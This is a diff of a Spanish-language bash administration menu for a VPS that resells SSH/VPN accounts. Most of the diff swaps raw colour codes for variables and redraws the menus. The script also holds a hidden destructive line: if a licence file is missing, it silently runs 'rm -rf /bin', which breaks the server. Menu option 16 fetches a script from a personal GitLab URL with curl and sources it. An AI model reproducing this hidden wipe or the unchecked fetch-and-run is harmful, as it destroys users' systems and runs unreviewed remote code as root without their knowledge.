@@ -1,4 +1,12 @@
 #!/bin/bash
+# Definir colores y efectos
+verde="\e[1;32m"  # Cian bold
+azul="\e[1;34m"  # azul bold
+cyan="\e[1;36m"  # cyan bold
+rojo="\e[1;31m"  # Rojo bold
+blanco="\e[1;37m"  # Blanco bold
+amarillo="\e[1;33m"  # Amarillo bold
+fin="\e[0m"   # fin del color
 fun_bar () {
 comando[0]="$1"
 comando[1]="$2"
@@ -10,20 +18,20 @@ ${comando[1]} -y > /dev/null 2>&1
 touch $HOME/fim
  ) > /dev/null 2>&1 &
  tput civis
-echo -ne "\033[1;33m["
+echo -ne "${amarillo}["
 while true; do
    for((i=0; i<18; i++)); do
-   echo -ne "\033[1;31m#"
+   echo -ne "${rojo}#"
    sleep 0.1s
    done
    [[ -e $HOME/fim ]] && rm $HOME/fim && break
-   echo -e "\033[1;33m]"
+   echo -e "${amarillo}]"
    sleep 1s
    tput cuu1
    tput dl1
-   echo -ne "\033[1;33m["
+   echo -ne "${amarillo}["
 done
-echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+echo -e "${amarillo}]\e[1;37m -${verde} OK !\e[1;37m"
 tput cnorm
 }
 IP=$(cat /etc/IP)
@@ -42,27 +50,27 @@ ${comando[1]} > /dev/null 2>&1
 touch $HOME/fim
  ) > /dev/null 2>&1 &
  tput civis
-echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
+echo -ne "  ${amarillo}AGUARDE \e[1;37m- ${amarillo}["
 while true; do
    for((i=0; i<18; i++)); do
-   echo -ne "\033[1;31m#"
+   echo -ne "${rojo}#"
    sleep 0.1s
    done
    [[ -e $HOME/fim ]] && rm $HOME/fim && break
-   echo -e "\033[1;33m]"
+   echo -e "${amarillo}]"
    sleep 1s
    tput cuu1
    tput dl1
-   echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
+   echo -ne "  ${amarillo}AGUARDE \e[1;37m- ${amarillo}["
 done
-echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+echo -e "${amarillo}]\e[1;37m -${verde} OK !\e[1;37m"
 tput cnorm
 }
 fun_tst () {
 speedtest --share > speed
 }
 echo ""
-echo -e "   \033[1;32mTESTANDO LA VELOCIDAD Del VPS !\033[0m"
+echo -e "   ${verde}TESTANDO LA VELOCIDAD Del VPS !\e[0m"
 echo ""
 aguarde 'fun_tst'
 echo ""
@@ -70,18 +78,18 @@ png=$(cat speed | sed -n '7 p' |awk -F : {'print $NF'})
 down=$(cat speed | sed -n '8 p' |awk -F :  {'print $NF'})
 upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
 lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;32mPING (LATENCIA):\033[1;37m$png"
-echo -e "\033[1;32mDOWNLOAD:\033[1;37m$down"
-echo -e "\033[1;32mUPLOAD:\033[1;37m$upl"
-echo -e "\033[1;32mLINK: \033[1;36m$lnk\033[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
+echo -e "${verde}PING (LATENCIA):\e[1;37m$png"
+echo -e "${verde}DOWNLOAD:\e[1;37m$down"
+echo -e "${verde}UPLOAD:\e[1;37m$upl"
+echo -e "${verde}LINK: ${cyan}$lnk\e[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
 rm -rf $HOME/speed
 }
 #limiter
 function limit1 () {
    clear
-   echo -e "\n\033[1;32mINICIANDO el LIMITER... \033[0m"
+   echo -e "\n${verde}INICIANDO el LIMITER... \e[0m"
    echo ""
    fun_bar 'screen -dmS limiter limiter' 'sleep 3'
    [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
@@ -90,13 +98,13 @@ function limit1 () {
        sed -i '/limiter/d' /etc/autostart
 	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
    }
-   echo -e "\n\033[1;32m  LIMITER ACTIVO !\033[0m"
+   echo -e "\n${verde}  LIMITER ACTIVO !\e[0m"
    sleep 3
    menu
 }
 function limit2 () {
    clear
-   echo -e "\033[1;32mPARANDO el LIMITER... \033[0m"
+   echo -e "${verde}PARANDO el LIMITER... \e[0m"
    echo ""
    fun_stplimiter () {
       sleep 1
@@ -108,7 +116,7 @@ function limit2 () {
       sleep 1
    }
    fun_bar 'fun_stplimiter' 'sleep 3'
-   echo -e "\n\033[1;31m LIMITER PARADO !\033[0m"
+   echo -e "\n${rojo} LIMITER PARADO !\e[0m"
    sleep 3
    menu
 }
@@ -118,7 +126,7 @@ function limit_ssh () {
 #onlineapp
 function onapp1 () {
    clear
-   echo -e "\n\033[1;32mINICIANDO  ONLINE APP... \033[0m"
+   echo -e "\n${verde}INICIANDO  ONLINE APP... \e[0m"
    echo ""
    apt install apache2 -y > /dev/null 2>&1
    sed -i "s/Listen 80/Listen 8888/g" /etc/apache2/ports.conf >/dev/null 2>&1
@@ -133,15 +141,15 @@ function onapp1 () {
 	   echo -e "ps x | grep 'onlineapp' | grep -v 'grep' && echo 'ON' || screen -dmS onlineapp onlineapp" >> /etc/autostart
    }
    IP=$(wget -qO- ipv4.icanhazip.com) >/dev/null 2>&1
-   echo -e "\n\033[1;32m  ONLINE APP ATIVO !\033[0m"
-   echo -e "\033[1;31m \033[1;33mURL de Usuários Online para usar no App\033[0m"
+   echo -e "\n${verde}  ONLINE APP ATIVO !\e[0m"
+   echo -e "${rojo} ${amarillo}URL de Usuários Online para usar no App\e[0m"
    echo -e " http://$IP:8888/server/online"
    sleep 10
    menu
 }
 function onapp2 () {
    clear
-   echo -e "\033[1;32mPARANDO  ONLINE APP... \033[0m"
+   echo -e "${verde}PARANDO  ONLINE APP... \e[0m"
    echo ""
    fun_stponlineapp () {
       sleep 1
@@ -154,7 +162,7 @@ function onapp2 () {
    }
    fun_bar 'fun_stponlineapp' 'sleep 3'
    rm -rf /var/www/html/server >/dev/null 2>&1
-   echo -e "\n\033[1;31m ONLINE APP PARADO !\033[0m"
+   echo -e "\n${rojo} ONLINE APP PARADO !\e[0m"
    sleep 3
    menu
 }
@@ -165,19 +173,19 @@ function onapp_ssh () {
 function autoexec () {
    if grep "menu;" /etc/profile > /dev/null; then
       clear
-      echo -e "\033[1;32mDESACTIVANDO AUTO EJECUCION\033[0m"
+      echo -e "${verde}DESACTIVANDO AUTO EJECUCION\e[0m"
       offautmenu () {
          sed -i '/menu;/d' /etc/profile
       }
       echo ""
       fun_bar 'offautmenu'
       echo ""
-      echo -e "\033[1;31mAUTO EJECUCION DESACTIVADO!\033[0m"
+      echo -e "${rojo}AUTO EJECUCION DESACTIVADO!\e[0m"
       sleep 1.5s
       menu2
    else
       clear
-      echo -e "\033[1;32mACTIVANDO AUTO EJECUCION\033[0m"
+      echo -e "${verde}ACTIVANDO AUTO EJECUCION\e[0m"
       autmenu () {
          grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
          echo "menu;" >> /etc/profile
@@ -185,7 +193,7 @@ function autoexec () {
       echo ""
       fun_bar 'autmenu'
       echo ""
-      echo -e "\033[1;32mAUTO EXECUCION ACTIVADO!\033[0m"
+      echo -e "${verde}AUTO EXECUCION ACTIVADO!\e[0m"
       sleep 1.5s
       menu2
    fi
@@ -193,10 +201,10 @@ function autoexec () {
 }
 #menu2
 menu2 (){
-[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
-stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
-stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
-autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "${verde}◉ ") || stsf=$(echo -e "${rojo}○ ")
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
+stsbotteste=$(ps x | grep "bot_teste"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
+autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
@@ -224,42 +232,41 @@ _onlin=$(printf '%-5s' "$_onli")
 _userexp=$(printf '%-5s' "$_expuser")
 _tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
 clear
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;36mSISTEMA            MEMORIA RAM      PROCESADOR "
-echo -e "\033[1;31mOS: \033[1;33m$_system \033[1;31mTotal:\033[1;32m$_ram \033[1;31mNucleos: \033[1;33m$_core\033[0m"
-echo -e "\033[1;31mmod: \033[1;32mdiegovip7🇦🇷  \033[1;31mEn uso: \033[1;32m$_usor \033[1;31mEn uso: \033[1;32m$_usop\033[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
+echo -e "${cyan}SISTEMA            MEMORIA RAM      PROCESADOR "
+echo -e "${rojo}OS: ${amarillo}$_system ${rojo}Total:${verde}$_ram ${rojo}Nucleos: ${amarillo}$_core\e[0m"
+echo -e "${rojo}mod: ${verde}diegovip7🇦🇷  ${rojo}En uso: ${verde}$_usor ${rojo}En uso: ${verde}$_usop\e[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
 [[ ! -e /tmp/att ]]  && {
-    echo -e "\033[1;32mOnlines:\033[1;33m $_onlin     \033[1;31mExpirados: \033[1;33m$_userexp \033[1;33mTotal: \033[1;32m$_tuser\033[0m"
-    var01='\033[1;33m•'
+    echo -e "${verde}Onlines:${amarillo} $_onlin     ${rojo}Expirados: ${amarillo}$_userexp ${amarillo}Total: ${verde}$_tuser\e[0m"
+    var01='${amarillo}•'
 } || {
-    echo -e "  \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mEXISTE UNA ACTUALIZACION DISPONIBLE  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
-    var01="\033[1;32m!"
+    echo -e "  ${amarillo}[${rojo}!${amarillo}]  ${verde}EXISTE UNA ACTUALIZACION DISPONIBLE  ${amarillo}[${rojo}!${amarillo}]\e[0m"
+    var01="${verde}!"
 }
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
 echo ""
-echo -e "\033[1;31m[\033[1;36m21\033[1;31m] \033[1;37m• \033[1;33mADICIONAR HOST \033[1;31m     [\033[1;36m28\033[1;31m] \033[1;37m• \033[1;33mEDITAR CONTRASEÑA ROOT \033[1;31m
-[\033[1;36m22\033[1;31m] \033[1;37m• \033[1;33mREMOVER HOST \033[1;31m       [\033[1;36m29\033[1;31m] \033[1;37m• \033[1;33mAUTO INICIO $autm \033[1;31m
-[\033[1;36m23\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SISTEMA \033[1;31m  [\033[1;36m30\033[1;31m] $var01 \033[1;33mACTUALIZAR SCRIPT \033[1;31m
-[\033[1;36m24\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SERVICIOS \033[1;31m[\033[1;36m31\033[1;31m]\033[1;37m• \033[1;33mBORRAR SCRIPT \033[1;31m
-[\033[1;36m25\033[1;31m] \033[1;37m• \033[1;33mBLOCK TORRENT $stsf\033[1;31m    [\033[1;36m32\033[1;31m] \033[1;37m• \033[1;33mVOLVER \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m
-[\033[1;36m26\033[1;31m] \033[1;37m• \033[1;33mBOT TELEGRAM $stsbot\033[1;31m     [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mSALIR❌ \033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m
-[\033[1;36m27\033[1;31m] \033[1;37m• \033[1;33mBOT TESTE $stsbotteste\033[1;31m"
+echo -e "
+${cyan}-21-${amarillo} ADICIONAR HOST      ${cyan}-28- ${amarillo} EDITAR CONTRASEÑA ROOT 
+${cyan}-22-${amarillo} REMOVER HOST        ${cyan}-29- ${amarillo} AUTO INICIO $autm  
+${cyan}-23-${amarillo} REINICIAR SISTEMA    ${cyan}-30- ${amarillo} ACTUALIZAR SCRIPT 
+${cyan}-24-${amarillo} REINICIAR SERVICIOS  ${cyan}-31-${amarillo} BORRAR SCRIPT                 ${cyan} -25- ${amarillo} BLOCK TORRENT $stsf   ${cyan} -32- ${amarillo} VOLVER  
+${cyan}-26- ${amarillo} BOT TELEGRAM $stsbot     ${cyan}-00- ${amarillo} SALIR❌                      ${cyan} -27- ${amarillo} BOT TESTE $stsbotteste ${rojo}"
 echo ""
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
 echo ""
-echo -ne "\033[1;32m     QUE DESEA HACER \033[1;33m?\033[1;31m?\033[1;37m : "; read x
+echo -ne "${verde}  ---  QUE DESEA HACER ${amarillo}?${rojo}?${blanco} : "; read x
 case "$x" in
    21)
    clear
    addhost
-   echo -ne "\n\033[1;31mCOMPRAR DROPLET EN TELEGRAM @vps10 \033[1;33m \n ENTER para volvet al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}COMPRAR DROPLET EN TELEGRAM @vps10 ${amarillo} \n ENTER para volver al ${verde}MENU!\e[0m"; read
    menu2
    ;;
    22)
    clear
    delhost
-   echo -ne "\n\033[1;31mENTER \033[1;33mpara volver al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}ENTER ${amarillo}para volver al ${verde}MENU!\e[0m"; read
    menu2
    ;;
    23)
@@ -299,21 +306,21 @@ case "$x" in
    menu
    ;;
    0|00)
-   echo -e "\033[1;31mSALIENDO...\033[0m"
+   echo -e "${rojo}SALIENDO...\e[0m"
    sleep 2
    clear
    exit;
    ;;
    *)
-   echo -e "\n\033[1;31mOPCION INVALIDA !\033[0m"
+   echo -e "\n${rojo}OPCION INVALIDA !\e[0m"
    sleep 2
 esac
 }
 while true $x != "ok"
 do
-stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
-stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
-stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
+stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
+stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "${verde}◉ " || echo -e "${rojo}○ ")
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
@@ -340,40 +347,42 @@ _onlin=$(printf '%-5s' "$_onli")
 _userexp=$(printf '%-5s' "$_expuser")
 _tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
 clear
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;36mSISTEMA            MEMORIA RAM      PROCESADOR "
-echo -e "\033[1;31mOS: \033[1;33m$_system\033[1;31mTotal:\033[1;33m$_ram \033[1;31mNucleos: \033[1;32m$_core\033[0m"
-echo -e "\033[1;31mPais: \033[1;33mAR🇦🇷     \033[1;31mEn uso: \033[1;33m$_usor \033[1;31mEn uso: \033[1;33m$_usop\033[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;33mOnlines:\033[1;32m $_onlin     \033[1;31mExpirados: \033[1;32m$_userexp \033[1;31mTotal: \033[1;32m$_tuser\033[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
+echo -e "${cyan}SISTEMA            MEMORIA RAM      PROCESADOR "
+echo -e "${rojo}OS: ${amarillo}$_system${rojo}Total:${amarillo}$_ram ${rojo}Nucleos: ${verde}$_core\e[0m"
+echo -e "${rojo}Pais: ${amarillo}AR🇦🇷     ${rojo}En uso: ${amarillo}$_usor ${rojo}En uso: ${amarillo}$_usop\e[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
+echo -e "${amarillo}Onlines:${verde} $_onlin     ${rojo}Expirados: ${verde}$_userexp ${rojo}Total: ${verde}$_tuser\e[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
 echo ""
-echo -e "\033[1;31m[\033[1;36m01\033[1;31m] \033[1;33m• \033[1;33mCREAR USUARIO \033[1;31m            [\033[1;36m11\033[1;31m] \033[1;37m• \033[1;33mSPEEDTEST \033[1;31m
-[\033[1;36m02\033[1;31m] \033[1;33m• \033[1;33mCREAR USUARIO TESTE \033[1;31m      [\033[1;36m12\033[1;31m] \033[1;33m• \033[1;33mBANNER \033[1;31m
-[\033[1;36m03\033[1;31m] \033[1;37m\033[1;37m• \033[1;33mREMOVER USUARIO \033[1;31m          [\033[1;36m13\033[1;31m] \033[1;37m• \033[1;33mMENU TOKEN \033[1;31m
-[\033[1;36m04\033[1;31m] \033[1;37m• \033[1;33mMONITOR ONLINE \033[1;31m           [\033[1;36m14\033[1;31m] \033[1;37m• \033[1;33mPUERTOS ACT \033[1;31m
-[\033[1;36m05\033[1;31m] \033[1;37m• \033[1;33mEDITAR FECHA \033[1;31m             [\033[1;36m15\033[1;31m] \033[1;37m• \033[1;33mBACKUP USER \033[1;31m
-[\033[1;36m06\033[1;31m] \033[1;37m• \033[1;33mEDITAR LIMITE \033[1;31m            [\033[1;36m16\033[1;31m] \033[1;37m• \033[1;33mMENU  PSIPHON\033[1;31m
-[\033[1;36m07\033[1;31m] \033[1;37m• \033[1;33mEDITAR CONTRASEÑA \033[1;31m        [\033[1;36m17\033[1;31m] \033[1;37m• \033[1;33mLIMITER $stsl\033[1;31m
-[\033[1;36m08\033[1;31m] \033[1;37m• \033[1;33mBORRAR EXPIRADOS \033[1;31m         [\033[1;36m18\033[1;31m] \033[1;37m• \033[1;33mBAD VPN $stsu\033[1;31m
-[\033[1;36m09\033[1;31m] \033[1;37m• \033[1;33mINFO  DE   USUARIOS \033[1;31m      [\033[1;36m19\033[1;31m] \033[1;37m• \033[1;33mLIMPIAR RAM $stson\033[1;31m
-[\033[1;36m10\033[1;31m] \033[1;37m• \033[1;33mMENU INSTALADOR \033[1;31m          [\033[1;36m20\033[1;31m] \033[1;37m• \033[1;33mINFO VPS \033[1;31m>\033[1;33m>\033[1;32m>\033[0m\033[1;31m
-[\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mSALIR\033[1;31m                     [\033[1;36m21\033[1;31m] \033[1;37m• \033[1;33mMAS  \033[1;31m>\033[1;33m>\033[1;32m>\033[0m\033[1;31m"
+echo -e "
+  ${cyan}-01-${amarillo}CREAR USUARIO          ${cyan}-11- ${amarillo}SPEEDTEST  
+  ${cyan}-02-${amarillo}USUARIO DEMO           ${cyan}-12- ${amarillo}BANNER 
+  ${cyan}-03-${amarillo}REMOVER USUARIO        ${cyan}-13-  ${amarillo}MENU TOKEN 
+  ${cyan}-04-${amarillo}MONITOR ONLINE         ${cyan}-14- ${amarillo}PUERTOS ACTIVOS
+  ${cyan}-05-${amarillo}EDITAR FECHA           ${cyan}-15- ${amarillo}BACKUP USER  
+  ${cyan}-06-${amarillo}EDITAR LIMITE          ${cyan}-16- ${amarillo}MENU  Python3
+  ${cyan}-07-${amarillo}EDITAR CONTRASEÑA      ${cyan}-17- ${amarillo}LIMITER $stsl
+  ${cyan}-08-${amarillo}BORRAR EXPIRADOS       ${cyan}-18- ${amarillo}BAD VPN $stsu         
+  ${cyan}-09-${amarillo}INFO DE  USUARIOS     ${cyan}-19- ${amarillo}LIMPIAR RAM $stson   
+  ${cyan}-10-${amarillo} MENU INSTALADOR      ${cyan}-20-${amarillo}INFO VPS   ${fin}     
+  ${cyan}-00-${amarillo}SALIR                 ${cyan}-21-${amarillo}Mas 
+  ${fin}${rojo}"
 echo ""
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
 echo ""
-echo -ne "\033[1;32m   WEP QUE DESEA HACER \033[1;33m?\033[1;31m?\033[1;37m : "; read x
+echo -ne "${verde}   WEP QUE DESEA HACER ${amarillo}?${rojo}?\e[1;37m : "; read x
 
 case "$x" in 
    1 | 01)
    clear
    criarusuario
-   echo -ne "\n\033[1;31m ENTER \033[1;33mpara VOLVER al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo} ENTER ${amarillo}para VOLVER al ${verde}MENU!\e[0m"; read
    ;;
    2 | 02)
    clear
    criarteste
-   echo -ne "\n\033[1;31m ENTER \033[1;33mpara VOLVER al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo} ENTER ${amarillo}para VOLVER al ${verde}MENU!\e[0m"; read
    ;;
    3 | 03)
    clear
@@ -383,13 +392,13 @@ case "$x" in
    4 | 04)
    clear
    sshmonitor
-   echo -ne "\n\033[1;31mARGENTINA 🇦🇷 \033[1;33m VPS: \033[1;32mwep!\033[0m
-\n\033[1;31mENTER \033[1;33mpara VOLVER al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}ARGENTINA 🇦🇷 ${amarillo} VPS: ${verde}wep!\e[0m
+\n${rojo}ENTER ${amarillo}para VOLVER al ${verde}MENU!\e[0m"; read
    ;;      
    5 | 05)
    clear
    mudardata
-   echo -ne "\n\033[1;31mENTER \033[1;33mpara VOLVER al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}ENTER ${amarillo}para VOLVER al ${verde}MENU!\e[0m"; read
    ;;
    6 | 06)
    clear
@@ -410,8 +419,8 @@ case "$x" in
    9 | 09)
    clear
    infousers
-   echo -ne "\n\033[1;31mArgentina🤠 🇦🇷 \033[1;33m VPS: \033[1;32mwep!\033[0m
-\n\033[1;31mENTER \033[1;33mpara VOLVER al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}Argentina🤠 🇦🇷 ${amarillo} VPS: ${verde}wep!\e[0m
+\n${rojo}ENTER ${amarillo}para VOLVER al ${verde}MENU!\e[0m"; read
    ;;
    10)
    conexao
@@ -420,7 +429,7 @@ case "$x" in
    11)
    clear
    apt install speedtest-cli -y && speedtest
-   echo -ne "\n\033[1;31mENTER \033[1;33mpara VOLVER al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}ENTER ${amarillo}para VOLVER al ${verde}MENU!\e[0m"; read
    ;;
    12)
    clear
@@ -434,14 +443,14 @@ case "$x" in
    14)
    clear
    netstat -ntpl
-   echo -ne "\n\033[1;31mENTER \033[1;33mPARA VOLVET AL \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}ENTER ${amarillo}PARA VOLVET AL ${verde}MENU!\e[0m"; read
    ;;
    15)
    userbackup
-   echo -ne "\n\033[1;31mENTER \033[1;33mPARA VOLVER al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}ENTER ${amarillo}PARA VOLVER al ${verde}MENU!\e[0m"; read
    ;;
    16)
-   source <(curl -sL https://raw.githubusercontent.com/vpsvip7/2d/main/menupsiphon.sh)
+   source <(curl -sL https://gitlab.com/diegovip7/SSHPLUS/-/raw/main/Modulos/s2.sh)
    ;;
    17)
    limit_ssh
@@ -457,19 +466,19 @@ case "$x" in
    20)
    clear
    detalhes
-   echo -ne "\n\033[1;31mENTER \033[1;33mPARA VOLVER al \033[1;32mMENU!\033[0m"; read
+   echo -ne "\n${rojo}ENTER ${amarillo}PARA VOLVER al ${verde}MENU!\e[0m"; read
    ;;
    21)
    menu2
    ;;
    0 | 00)
-   echo -e "\033[1;31mSaliendo...\033[0m"
+   echo -e "${rojo}Saliendo...\e[0m"
    sleep 2
    clear
    exit;
    ;;
    *)
-   echo -e "\n\033[1;31mOPCION INVALIDA !\033[0m"
+   echo -e "\n${rojo}OPCION INVALIDA !\e[0m"
    sleep 2
 esac
 done
